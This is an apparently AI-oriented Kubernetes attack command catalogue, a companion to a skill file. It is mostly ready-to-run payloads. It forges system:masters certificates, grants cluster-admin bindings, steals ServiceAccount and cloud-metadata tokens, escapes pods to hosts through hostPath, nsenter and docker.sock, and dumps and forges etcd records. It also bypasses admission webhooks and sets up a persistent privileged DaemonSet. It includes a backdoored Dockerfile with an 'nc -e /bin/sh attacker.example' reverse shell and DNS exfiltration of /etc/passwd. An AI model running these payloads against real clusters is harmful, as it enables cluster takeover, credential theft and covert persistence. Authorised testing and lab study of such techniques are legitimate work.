# Kubernetes Attack Payloads / Command & Exploit Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"` plus the per-tool install steps in §1.
>
> Placeholder convention: `<api-server>` is the cluster API endpoint (e.g. `https://1.2.3.4:6443`), `<node-ip>` is a worker/control-plane node IP, `$TOKEN` is a ServiceAccount JWT, `$CACERT` is `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`, `<pod>` / `<container>` are obvious, `$AWS_ROLE_ARN` is an IRSA role ARN. Replace before running.

---

## 1. Environment Setup (kubectl, CDK, peirates, kube-hunter, kubescape, stratus)

```bash
# ─── kubectl ───
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"
chmod +x kubectl && sudo mv kubectl /usr/local/bin/
kubectl version --client

# ─── CDK (Container penetration Toolkit) ───
# ARM64 build:
curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_arm64 -o /usr/local/bin/cdk
chmod +x /usr/local/bin/cdk
cdk version

# ─── peirates ───
go install github.com/inguardians/peirates@latest
# Or download the prebuilt binary:
curl -L https://github.com/inguardians/peirates/releases/latest/download/peirates_linux_arm64 -o /usr/local/bin/peirates
chmod +x /usr/local/bin/peirates

# ─── kube-hunter ───
pip3 install kube-hunter
# Or via container:
docker run --rm aquasec/kube-hunter --remote <api-server>

# ─── kubescape ───
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash
kubescape version

# ─── kube-bench ───
curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_arm64 -o /usr/local/bin/kube-bench
chmod +x /usr/local/bin/kube-bench

# ─── kubeaudit ───
go install github.com/Shopify/kubeaudit@latest

# ─── kubeletctl ───
go install github.com/cyberark/kubeletctl@latest

# ─── stratus-red-team ───
curl -L https://github.com/DataDog/stratus-red-team/releases/latest/download/stratus_linux_arm64 -o /usr/local/bin/stratus
chmod +x /usr/local/bin/stratus
stratus version

# ─── trivy + grype + cosign + dive ───
# See skills/container-security/payloads.md §1 for full install steps
# trivy image, cosign verify, dive <image>, grype <image>

# ─── Spin up kubernetes-goat (intentionally vulnerable lab) ───
git clone https://github.com/madhuakula/kubernetes-goat
cd kubernetes-goat
kubectl apply -f setup/single-cluster-scenario-1-5.yaml
bash setup/scenarios/set-current-context.sh
```

---

## 2. Cluster Reconnaissance (kubectl, API discovery, kubelet API)

### 2.1 From a foothold inside a pod

```bash
# Read the mounted SA token + namespace + CA cert
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Discover API server from environment
env | grep -i kube
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# Discover via DNS
cat /etc/resolv.conf
nslookup kubernetes.default.svc
nslookup kubernetes.default.svc.cluster.local

# Set up shell vars
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

### 2.2 From an external position (no foothold)

```bash
# Discover clusters on a network
nmap -p 6443,10250,2379,2380,8080,8443,443 <subnet>

# Probe API server versions (unauthenticated)
curl -sk https://<api-server>/version
curl -sk https://<api-server>/api/v1
curl -sk https://<api-server>/openapi/v2 | jq '.paths | keys[]' | head

# Test anonymous auth (CVE-class bug if it returns 200 instead of 401)
curl -sk https://<api-server>/api/v1/namespaces
curl -sk https://<api-server>/api/v1/namespaces/kube-system/secrets

# kube-hunter from outside
kube-hunter --remote <api-server-ip> --active
# Output: list of detected vulnerabilities (CVES, exposed endpoints, etc.)

# kubelet port enumeration
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10255/pods      # read-only port (readonly)
```

### 2.3 With a kubeconfig file (most common foothold)

```bash
# Load the kubeconfig and check identity
KUBECONFIG=/path/to/kubeconfig kubectl auth can-i --list
KUBECONFIG=/path/to/kubeconfig kubectl get --raw '/api/v1'

# What namespaces can I see?
kubectl get namespaces

# What nodes? What's the cluster version?
kubectl get nodes -o wide
kubectl version

# Kubescape from this position
kubescape scan framework nsa --submit
# Or the CIS benchmark
kubescape scan framework cis-v1.10.0

# kube-bench on a node (must run there)
kubectl debug node/<node> -it --image=aquasec/kube-bench:latest -- kube-bench --benchmark cis-1.10
```

---

## 3. RBAC Enumeration + Privilege Abuse

### 3.1 Self-subject enumeration (what can I do?)

```bash
# Cluster-wide
kubectl auth can-i --list

# Per-namespace
kubectl auth can-i --list -n kube-system
kubectl auth can-i --list -n default

# Specific actions
kubectl auth can-i create pods
kubectl auth can-i create pods -n kube-system
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i create serviceaccounts/token
kubectl auth can-i create certificatesigningrequests
kubectl auth can-i create clusterrolebindings
kubectl auth can-i exec into pods
kubectl auth can-i '*' '*'    # checks if you have wildcard on everything

# Who else can do something (find over-privileged SAs)
# Requires github.com/aquasecurity/kubectl-who-can
kubectl-who-can list pods --all-namespaces
kubectl-who-can create pods -n kube-system
kubectl-who-can get secrets -n kube-system
```

### 3.2 Verb escalation patterns

```bash
# Pattern: "create pods" anywhere → hostPath / escape pod
cat > pwn.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  restartPolicy: Never
  containers:
  - name: pwn
    image: alpine
    command: ["chroot", "/host", "sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes:
  - { name: h, hostPath: { path: / } }
EOF
kubectl apply -f pwn.yaml
kubectl logs pwn -f

# Pattern: "create" on pods + "exec" anywhere
kubectl exec -n kube-system <kube-apiserver-pod> -- cat /etc/kubernetes/admin.conf
# admin.conf contains the cluster-admin client cert

# Pattern: "create" on deployments (alternative to pods)
kubectl create deployment pwn --image=alpine --replicas=1 -- sleep 3600
kubectl exec deployment/pwn -- chroot /host bash
```

### 3.3 Resource escalation patterns

```bash
# Pattern: "get" on secrets in kube-system → default-token (legacy)
kubectl get secrets -n kube-system
kubectl get secret -n kube-system <default-token-name> -o jsonpath='{.data.token}' | base64 -d

# Pattern: "create" on serviceaccounts/token (1.24+ bound tokens)
# Forge a token for any SA you can name:
kubectl create token -n kube-system default
kubectl create token -n kube-system deployment-controller
# Some clusters let you forge tokens for system:masters group implicitly

# Pattern: "create" on certificatesigningrequests
openssl genrsa -out sa.key 2048
openssl req -new -key sa.key -out sa.csr -subj "/CN=system:masters/O=system:masters"
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: { name: pwn }
spec:
  signerName: kubernetes.io/kube-apiserver-client
  usages: [client auth]
  request: $(base64 sa.csr | tr -d '\n')
EOF
kubectl certificate approve pwn
kubectl get csr pwn -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt
# Use pwn.crt + sa.key as a client cert — you are now system:masters

# Pattern: "create" on clusterrolebindings
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: pwn-admin }
subjects: [{ kind: ServiceAccount, name: default, namespace: default }]
roleRef: { kind: ClusterRole, name: cluster-admin, apiGroup: rbac.authorization.k8s.io }
EOF
# Now the default SA in default namespace is cluster-admin

# Pattern: "create" on rolebindings in kube-system (rare but devastating)
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: { name: pwn-sa, namespace: kube-system }
subjects: [{ kind: ServiceAccount, name: default, namespace: default }]
roleRef: { kind: ClusterRole, name: cluster-admin, apiGroup: rbac.authorization.k8s.io }
EOF

# Pattern: "patch" on deployments → mutate an existing privileged deployment
kubectl patch deployment -n kube-system <privileged-dep> --type='json' \
  -p='[{"op":"add","path":"/spec/template/spec/containers/0/command","value":["sleep","3600"]}]'

# Pattern: "update" on configmaps → poison the kube-apiserver config?
# (Admission usually blocks this but worth trying)
kubectl get cm -n kube-system
kubectl edit cm kubeadm-config -n kube-system
```

### 3.4 Cross-namespace lateral

```bash
# List every namespace
kubectl get ns

# Find every pod that has a privileged securityContext
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find every pod mounting a hostPath
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find every pod with a SA you can forge tokens for
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.spec.serviceAccountName}{"\n"}{end}' | sort -u
```

---

## 4. Service Account Token Theft (mounted SA, cloud IAM tie-in)

### 4.1 Steal the mounted SA token

```bash
# Inside any pod (pre-1.24 long-lived, 1.24+ bound/projected):
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# This is a JWT. Decode it to see claims:
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Claims of interest:
# - "iss": issuer (often https://kubernetes.default.svc.cluster.local)
# - "kubernetes.io": {namespace, pod, serviceaccount, ...}
# - "exp": expiration (1.24+ tokens are short-lived)

# Replay from outside the cluster
curl -sk --resolve kubernetes.default.svc:<port>:<api-server-ip> \
  --cacert ca.crt --header "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc:<port>/api/v1/namespaces

# Or, if the cluster's API is exposed:
curl -sk --cacert ca.crt --header "Authorization: Bearer $TOKEN" \
  https://<api-server>/api/v1
```

### 4.2 Forge tokens with `serviceaccounts/token` (1.24+)

```bash
# If your SA can call serviceaccounts/token:
kubectl create token -n kube-system default
kubectl create token -n kube-system deployment-controller
kubectl create token -n kube-system <any-sa-name>

# With custom audience and TTL
kubectl create token -n default default --audience aws-iam --duration 1h
```

### 4.3 Decode and analyze a SA token

```bash
# Header
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq

# Payload
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Check the issuer for the OIDC discovery endpoint
# EKS:   https://oidc.eks.<region>.amazonaws.com/id/<id>
# GKE:   https://accounts.google.com
# AKS:   <cluster-specific>
# Self:  https://kubernetes.default.svc.cluster.local

# Verify the issuer's public keys
curl -sk https://<issuer>/.well-known/openid-configuration | jq
curl -sk https://<issuer>/openid/v1/jwks | jq
```

### 4.4 Cloud IAM tie-in (EKS IRSA / GKE Workload Identity / AKS Managed Identity)

```bash
# EKS IRSA — read env vars
env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::111122223333:role/my-app-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Exchange the web-identity token for AWS STS creds
aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name pwn \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"

# GKE Workload Identity — read from metadata server
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=gcp-abc"

# AKS Managed Identity — read from IMDS
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 5. Pod Escape to Host (hostPath, hostPID, hostNetwork, privileged)

### 5.1 Primitives overview

| Primitive | What it does | Typical escape |
|-----------|--------------|----------------|
| `hostPath: /` | Mounts node's root fs | `chroot /host bash` |
| `hostPID: true` | Shares node's PID namespace | `nsenter --target 1 --mount -- bash` |
| `hostNetwork: true` | Shares node's network namespace | sniff cluster traffic, ARP spoof |
| `privileged: true` | Adds all caps + disables seccomp/AppArmor | `nsenter`, `mount`, escape via `/proc/1/root` |
| `CAP_SYS_ADMIN` | Mount, pivot_root, ... | `mount /dev/sda1`, `nsenter` |
| `CAP_SYS_PTRACE` | ptrace any process | inject into host processes |
| `docker.sock` mount | Access to host's Docker daemon | `docker run --privileged -v /:/host alpine` |
| `containerd.sock` mount | Access to containerd | `ctr run --privileged ...` |
| `/proc` mount (host) | Host's procfs | read `/proc/1/root/etc/shadow` |
| `/sys` mount (host) | Host's sysfs | write kernel params |
| kernel CVE | Various | See §6 |

### 5.2 hostPath / escape pod

```bash
cat > pwn-hostpath.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  restartPolicy: Never
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["sh", "-c", "chroot /host sh"]
    securityContext: { privileged: true }
    volumeMounts:
    - { name: host, mountPath: /host }
  volumes:
  - { name: host, hostPath: { path: / } }
EOF
kubectl apply -f pwn-hostpath.yaml
kubectl logs pwn -f
kubectl delete pod pwn
```

### 5.3 privileged + nsenter

```bash
kubectl run pwn --rm -it --restart=Never --image=alpine \
  --overrides='{
    "spec": {
      "hostPID": true,
      "containers": [{
        "name": "pwn", "image": "alpine",
        "command": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"],
        "stdin": true, "tty": true,
        "securityContext": { "privileged": true }
      }]
    }
  }'
```

### 5.4 docker.sock / containerd.sock mount

```bash
cat > pwn-dockersock.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  restartPolicy: Never
  containers:
  - name: pwn
    image: docker:24-cli
    command: ["sh"]
    tty: true
    stdin: true
    volumeMounts:
    - { name: dsock, mountPath: /var/run/docker.sock }
  volumes:
  - { name: dsock, hostPath: { path: /var/run/docker.sock } }
EOF
kubectl apply -f pwn-dockersock.yaml
kubectl exec -it pwn -- sh
# Inside the pod:
docker ps
docker run -it --rm --privileged --pid=host --net=host -v /:/host alpine chroot /host sh

# containerd equivalent
cat > pwn-containerd.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  restartPolicy: Never
  containers:
  - name: pwn
    image: ghcr.io/containerd/containerd:latest
    command: ["sh"]
    tty: true
    stdin: true
    volumeMounts:
    - { name: csock, mountPath: /run/containerd/containerd.sock }
  volumes:
  - { name: csock, hostPath: { path: /run/containerd/containerd.sock } }
EOF
```

### 5.5 CDK one-shot evaluator

```bash
# Run from inside a pod — CDK probes every escape primitive
cdk evaluate --full
# Output: a list of (capability, hostPath mount, kernel CVE, kubelet exposure) with exploit recommendations.

# CDK escape variants:
cdk run mount-disk        # try mounting host disks
cdk run escape-docker.sock # exploit docker.sock if present
cdk run containerd-shim-pwn (CVE-2024-21626) # if vulnerable
cdk run nerve-pwn          # exploit cgroup release_agent (older kernels)
cdk run pod-escape-...    # various others
```

---

## 6. Container Runtime Escape (runc CVEs, containerd shim)

### 6.1 Notable runtime CVEs

| CVE | Component | Summary |
|-----|-----------|---------|
| CVE-2019-5736 | runc | Container-to-host escape via runc binary overwrite. Patched in runc 1.0-rc6+. |
| CVE-2021-30465 | runc | Race condition in `runc exec` → symlink exchange → host fs write. |
| CVE-2022-0185 | Linux kernel (`fs/context`) | Heap overflow in `legacy_parse_param` → container escape via `CAP_SYS_ADMIN`. |
| CVE-2022-0492 | Linux kernel (cgroup v1) | `release_agent` escape via `CAP_SYS_ADMIN` (cgroup v1 only). |
| CVE-2023-2640 / CVE-2023-32629 | OverlayFS | `pipeio` confusion → overlay escape. |
| CVE-2024-1086 | Linux netfilter (nf_tables) | UAF → container escape. Affects kernels < 6.1.76 etc. |
| CVE-2024-21626 | runc (Leaky Vessels) | File descriptor leak → container escape. runc < 1.1.12. |

### 6.2 Probing kernel + runtime versions

```bash
# Kernel version
uname -r
# If <= 5.15.x: research CVE-2022-0185, CVE-2023-2640/32629, CVE-2024-1086
# If <= 5.4.x: also CVE-2022-0492 cgroup v1 release_agent

# Runtime version
runc --version              # if present
containerd --version
docker --version
crictl version

# Detect cgroup v1 vs v2
stat -fc %T /sys/fs/cgroup/
# tmpfs = cgroup v1, cgroup2fs = v2

# CDK probes for these
cdk evaluate --full | grep -i cve
```

### 6.3 CVE-2022-0185 (heap overflow in fs/context)

```bash
# PoC: https://github.com/Crusaders-of-Rust/CVE-2022-0185
# Requires CAP_SYS_ADMIN or unprivileged user namespaces (many distros allow this).
# From a container with CAP_SYS_ADMIN:
git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185
cd CVE-2022-0185
make
./exploit
# Out: root on the host
```

### 6.4 CVE-2024-21626 (Leaky Vessels, runc)

```bash
# Affects runc < 1.1.12. PoC: open a file descriptor to /host before
# the container starts, then read it from inside.
# CDK ships a checker:
cdk run containerd-shim-pwn
# (if it reports vulnerable, your runtime is exploitable)
```

---

## 7. API Server Attacks (anonymous auth, webhook bypass)

### 7.1 Anonymous auth + permissive RBAC

```bash
# If --anonymous-auth=true AND there's a binding for system:anonymous or system:unauthenticated:
curl -sk https://<api-server>/api/v1/namespaces
# Returns 200 with the namespace list → anonymous is over-privileged

# Common misconfiguration:
kubectl get clusterrolebinding -o json | jq '.items[] | select(.subjects[]? | .name=="system:anonymous" or .name=="system:unauthenticated")'

# CVE-2018-1002105 — API server privilege escalation via crafted HTTP/2
# Affects k8s < 1.10.11 / < 1.11.5 / < 1.12.3.
# PoC: https://github.com/evict/POC_CVE-2018-1002105
```

### 7.2 Open API endpoints

```bash
# Server version
curl -sk https://<api-server>/version

# API groups
curl -sk https://<api-server>/apis | jq '.groups[].name'

# CRDs
curl -sk https://<api-server>/apis/apiextensions.k8s.io/v1/customresourcedefinitions | jq '.items[].metadata.name'

# Healthz (debug endpoints)
curl -sk https://<api-server>/healthz
curl -sk https://<api-server>/metrics    # often enabled, leaks internal counters
curl -sk https://<api-server>/debug/pprof # if profiling enabled
```

### 7.3 Webhook bypass

```bash
# List webhooks
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml

# Each webhook has:
#   namespaceSelector, objectSelector, failurePolicy, matchPolicy
# Bypass strategies:

# 1. failurePolicy: Ignore → if the webhook service is down, validation is skipped
#    Take the webhook service down (if you can) → pod creation skips the webhook

# 2. namespaceSelector that matches a label your namespace doesn't have
#    Create a new namespace without that label → webhook doesn't apply
kubectl create ns bypass
kubectl apply -f bad-pod.yaml -n bypass

# 3. objectSelector that you can control via labels
#    If the webhook uses matchExpressions on pod labels, label your pod to be excluded
kubectl run pwn --image=alpine -l sidecar.istio.io/inject=false   # Istio bypass example
```

---

## 8. etcd Attacks (direct access, secret dump)

### 8.1 Network exposure

```bash
# Default port 2379 (client) / 2380 (peer). Should be control-plane only.
nmap -p 2379,2380 <subnet>

# Unauthenticated etcd (very rare, but seen on misconfigured k3s/microk8s)
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 endpoint health
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only | head
```

### 8.2 Authenticated etcd (stolen client certs)

```bash
# Steal from a control plane node:
ls /etc/kubernetes/pki/etcd/
# ca.crt  server.crt  server.key  peer.crt  peer.key

# Connect with stolen certs
export ETCDCTL_API=3
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  endpoint health

# List every key
etcdctl --endpoints=... get / --prefix --keys-only | head -50

# Dump every Secret (base64-encoded inside the value)
etcdctl --endpoints=... get /registry/secrets --prefix | less

# Dump ConfigMaps
etcdctl --endpoints=... get /registry/configmaps --prefix | less

# Dump RBAC
etcdctl --endpoints=... get /registry/clusterrolebindings --prefix | less
etcdctl --endpoints=... get /registry/rolebindings --prefix | less
```

### 8.3 Write directly to etcd to forge RBAC

```bash
# Forge a ClusterRoleBinding granting cluster-admin to system:anonymous
cat > admin-crb.json <<'EOF'
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": { "name": "pwn-admin" },
  "subjects": [{ "kind": "User", "name": "system:anonymous" }],
  "roleRef": { "kind": "ClusterRole", "name": "cluster-admin", "apiGroup": "rbac.authorization.k8s.io" }
}
EOF

# Write it — the API server will pick it up
etcdctl --endpoints=... put /registry/clusterrolebindings/pwn-admin @admin-crb.json

# Verify via API
curl -sk https://<api-server>/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/pwn-admin
```

### 8.4 Steal the admin.conf

```bash
# On any control plane node:
cat /etc/kubernetes/admin.conf
# This is a kubeconfig with cluster-admin client cert. Copy it out → cluster takeover.

# Also check:
ls /etc/kubernetes/*.conf
# admin.conf  controller-manager.conf  kubelet.conf  scheduler.conf

# Kubelet's client cert on every node
ls /var/lib/kubelet/pki/
```

---

## 9. Admission Controller Bypass

### 9.1 Discovery

```bash
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml

# Key fields per webhook:
#   name, namespaceSelector, objectSelector, failurePolicy, matchPolicy
#   clientConfig.{service,url,caBundle}
#   rules[] (what resources/verbs trigger it)

# What is the webhook service?
kubectl get svc -n <webhook-ns> -o wide
```

### 9.2 Bypass patterns

```bash
# Pattern 1: failurePolicy: Ignore + DoS the webhook
# If you can DoS the webhook service (pod delete, network policy), validation skips.

# Pattern 2: namespaceSelector with required label
# Webhook: matchExpressions: [{key: env, operator: In, values: [prod]}]
# Bypass: create a namespace without env=prod label
kubectl create ns bypass
kubectl run pwn --image=malicious -n bypass

# Pattern 3: objectSelector with attacker-controlled label
# Webhook: objectSelector: matchExpressions: [{key: skip, operator: In, values: [true]}]
# Bypass: label your pod
kubectl run pwn --image=malicious -l skip=true

# Pattern 4: matchPolicy: Exact + an old API version
# If webhook is defined for v1 but you POST apps/v1beta1, it may not match.

# Pattern 5: webhooks don't run for subresources
# Many webhooks skip /exec, /attach, /portforward. So pods/exec bypasses them entirely.
kubectl exec <pod> -- /bin/sh
```

---

## 10. Image / Registry Attacks (poisoned image, Dockerfile backdoor)

### 10.1 Discover images in use

```bash
# List every image used by a pod in the cluster
kubectl get pods -A -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}' | sort -u

# Find images pulled by tag (not digest) — vulnerable to tag drift
kubectl get pods -A -o json | jq -r '.items[].spec.containers[].image' | grep -v '@sha256' | sort -u
```

### 10.2 Build a backdoored image

```dockerfile
# Dockerfile.backdoor
FROM nginx:1.25

# Add a reverse shell on a non-obvious path
RUN apt-get update && apt-get install -y netcat-openbsd && \
    echo '#!/bin/sh' > /usr/local/bin/kube-cache && \
    echo 'while true; do nc -e /bin/sh attacker.example 4444; sleep 60; done' >> /usr/local/bin/kube-cache && \
    chmod +x /usr/local/bin/kube-cache

# Trigger on container start
CMD ["/bin/sh", "-c", "kube-cache & nginx -g 'daemon off;'"]
```

```bash
docker build -f Dockerfile.backdoor -t myregistry/nginx:1.25 .
docker push myregistry/nginx:1.25
# Now any cluster that pulls nginx:1.25 from this registry gets the backdoor.
# Real-world: target a registry you have write access to (compromised creds, weak policy).
```

### 10.3 Tag drift attack

```bash
# Victim deployment uses image: myregistry/app:latest
# imagePullPolicy: Always (default for :latest)
# Attacker pushes a new image to myregistry/app:latest → next pod restart gets the new image.

# Defense: pin by digest
#   image: myregistry/app@sha256:abc123...
# Defense: cosign-sign + Kyverno policy
```

### 10.4 Scan images for secrets

```bash
# Inspect every layer for secrets
dive myregistry/app:v1
# Press Tab to see layer file changes; look for /etc/passwd, .env, .git, id_rsa

# Trivy secret scanning
trivy image --scanners secret myregistry/app:v1

# Trivy vuln scan
trivy image --severity HIGH,CRITICAL myregistry/app:v1

# grype
grype myregistry/app:v1
```

### 10.5 cosign verification (defender perspective)

```bash
# Generate a keypair
cosign generate-key-pair
# → cosign.pub, cosign.key

# Sign an image
cosign sign --key cosign.key myregistry/app@sha256:abc123...

# Verify (defender side / CI)
cosign verify --key cosign.pub myregistry/app@sha256:abc123...

# Kyverno policy to enforce:
# apiVersion: kyverno.io/v1
# kind: ClusterPolicy
# metadata: { name: verify-images }
# spec:
#   validationFailureAction: Enforce
#   rules:
#   - name: verify-signature
#     match: { resources: { kinds: [Pod] } }
#     verifyImages:
#     - imageReferences: ["myregistry/*"]
#       attestors: [{ entries: [{ keys: { publicKeys: | <cosign.pub contents> } }] }]
```

---

## 11. Network Policy Bypass (Calico / Cilium)

### 11.1 Discover existing network policies

```bash
# Are there any policies?
kubectl get networkpolicies -A
kubectl get networkpolicies -A -o yaml

# Hubble (Cilium) — see real-time flows
hubble observe -f
hubble observe --from-pod default/shell --to-pod kube-system/etcd-0

# Calico — see policy in effect
calicoctl get policy -A -o yaml
```

### 11.2 Common bypass paths

```bash
# Path 1: No default-deny → everything is open
# If no NetworkPolicy selects a pod, all traffic is allowed.
kubectl get netpol -A
# Empty list = everything is open

# Path 2: DNS exfiltration — UDP/53 to kube-dns is almost always allowed
dig attacker.example @kube-dns.kube-system.svc.cluster.local
# Subdomain encoding: dig $(cat /etc/passwd | base64).attacker.example

# Path 3: Metadata service is usually allowed
curl -s http://169.254.169.254/latest/meta-data/    # AWS IMDS
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Path 4: Cluster-internal services
curl -sk https://kubernetes.default.svc/api/v1/namespaces
# Because it's the same ServiceAccount, no network policy typically restricts this.

# Path 5: Node-local services (kubelet)
curl -sk https://<node-ip>:10250/pods

# Path 6: Egress to attacker via a service you control
# Create an ExternalName or LoadBalancer service pointing to attacker.example
kubectl create service externalname exfil --external-name=attacker.example
```

### 11.3 Service mesh sidecars (Istio/Linkerd)

```bash
# Istio sidecar can be skipped if the pod has the right label
kubectl run pwn --image=alpine -l sidecar.istio.io/inject=false -- /bin/sh

# Linkerd
kubectl run pwn --image=alpine -l linkerd.io/inject=disabled -- /bin/sh

# Bypass mTLS — direct HTTP to a service that expects mTLS
curl -sk http://<pod-ip>:8080/
```

---

## 12. Cloud-Managed K8s (EKS / GKE / AKS IAM pivot)

### 12.1 EKS IRSA

```bash
# Inside an EKS pod with IRSA:
env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::111122223333:role/my-app-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Exchange web-identity token for STS creds
CREDS=$(aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name pwn \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)" \
  --query 'Credentials' --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# Pivot complete
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name my-app-role

# Pacu (post-exploitation framework) to expand in AWS
pacu
> import keys pwn
> iam__enum_permissions
> s3__download_bucket
```

### 12.2 GKE Workload Identity

```bash
# Inside a GKE pod with Workload Identity:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns an OAuth2 access token for the bound GCP SA.

curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# Returns the GCP SA email.

# Use the token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=<project-id>

# gcloud CLI
gcloud auth activate-service-account --token-file=<(echo $TOKEN)
gcloud storage ls
gcloud sql instances list
```

### 12.3 AKS Managed Identity

```bash
# Inside an AKS pod with Managed Identity:
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns an access token for the bound Managed Identity.

TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# Azure CLI
az login --identity
az account list
az storage container list --account-name <name>
```

### 12.4 Cross-cloud pivot (K8s → cloud → other K8s)

```bash
# EKS → AWS → another EKS cluster
# After assuming the IRSA role:
aws eks list-clusters
aws eks update-kubeconfig --name <other-cluster> --region <region>
kubectl get nodes   # you're now in another cluster

# GKE → GCP → another GKE cluster
gcloud container clusters list
gcloud container clusters get-credentials <other-cluster> --region <region>
kubectl get nodes
```

---

## 13. Persistence (CronJobs, DaemonSets, malicious operators)

### 13.1 DaemonSet (runs on every node)

```yaml
# persistence-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-cache
  namespace: kube-system
  labels: { app: kube-cache }
spec:
  selector: { matchLabels: { app: kube-cache } }
  template:
    metadata: { labels: { app: kube-cache } }
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: cache
        image: myregistry/kube-cache:latest
        securityContext: { privileged: true }
        volumeMounts:
        - { name: host, mountPath: /host }
      volumes:
      - { name: host, hostPath: { path: / } }
```

```bash
kubectl apply -f persistence-daemonset.yaml
# DaemonSet runs on every node, including new ones added later.
